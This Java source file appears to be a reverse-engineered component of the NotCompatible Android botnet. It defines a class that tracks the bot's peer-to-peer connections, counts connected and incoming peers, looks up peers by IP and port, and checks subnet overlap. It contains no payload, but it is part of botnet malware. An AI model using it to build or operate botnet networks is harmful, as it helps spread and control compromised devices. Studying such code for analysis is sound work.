package diff.notcompatible.c.bot.net.tcp.objects;

import diff.notcompatible.c.bot.net.tcp.P2PLink;
import diff.notcompatible.c.bot.objects.List;

public class P2PConnectionList {

	List list;
	
	public P2PConnectionList() {
		list = new List();
	}
	

	public void add(P2PLink p2pLink) {
		list.add(p2pLink);
	}


	public void delete(P2PLink p2pLink) {
		list.delete(p2pLink);
	}
	
	public int getCount() {
		return list.count;
	}
	
	public P2PLink getByIpAndPort(String ip, int port) {
		for(int i = 0; i < getCount(); i++) {
			P2PLink link = (P2PLink) list.getObject(i);
			if(link.channel.socket().getInetAddress().getHostAddress().equals(ip) && link.channel.socket().getPort() == port)
				return link;
		}
		
		return null;
	}
	
	public P2PLink getByIndex(int index) {
		return (P2PLink) list.getObject(index);
	}

	// Originally called "GetCondidate"
	public int getCandidates() {
		return getCount() - getConnections();
	}
	
	// Was previously "getConnection"
	public int getConnections() {
		int numOfConnected = 0;
		
		for(int i = 0; i < getCount(); i++)
			if(getByIndex(i).isConnected())
				numOfConnected++;
		
		return numOfConnected;
	}
	
	public int getIncomingConnections() {
		int numOfIncoming = 0;
		
		for(int i = 0; i < getCount(); i++)
			if(getByIndex(i).isIncoming)
				numOfIncoming++;
		
		return numOfIncoming;
	}
	
	// Check if ip address same subnet as any P2PLinks
	public boolean checkSubnet(String ipToCheck) {
        byte[] ip = ip2byte(ipToCheck);
        
        for(int i = 0; i < getCount(); i++) {
        	byte[] ip2 = ((P2PLink)list.getObject(i)).socketAddress.getAddress().getAddress();
        	if(ip[0] == ip2[0] &&
        			ip[1] == ip2[1] &&
        			ip[2] == ip2[2])
        		return true;
        }
        
        return false;
	}
	
    public static byte[] ip2byte(String IP) {
        byte[] buffer = new byte[4];
        
        String[] x = IP.split("\\.", 4);
        buffer[0] = (byte) (Integer.parseInt(x[0]) & 0xFF);
        buffer[1] = (byte) (Integer.parseInt(x[1]) & 0xFF);
        buffer[2] = (byte) (Integer.parseInt(x[2]) & 0xFF);
        buffer[3] = (byte) (Integer.parseInt(x[3]) & 0xFF);
        
        return buffer;
    }
}
